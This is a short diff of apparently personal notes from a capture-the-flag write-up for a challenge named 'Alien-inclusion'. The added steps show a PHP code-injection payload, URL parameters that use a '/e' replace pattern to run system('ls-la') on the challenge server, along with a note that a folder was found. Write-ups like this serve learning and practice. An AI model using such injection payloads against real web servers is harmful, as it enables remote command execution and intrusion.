@@ -71,6 +71,8 @@ Alien-inclusion
 
 substitute
 
-1. http://35.246.158.241:31431/index.php?vector=/Admin/e&replace=system(‘?????????’)
-2. Found folder here_we_dont_have_flag
-3. modify the URL 
+1. first send ?vector=admin&replace='smth'
+2. ?vector=/Admin/&replace=system('ls-la')
+3. http://35.246.158.241:31431/index.php?vector=/Admin/e&replace=system(‘’)
+4. Found folder here_we_dont_have_flag
+5. modify the URL 
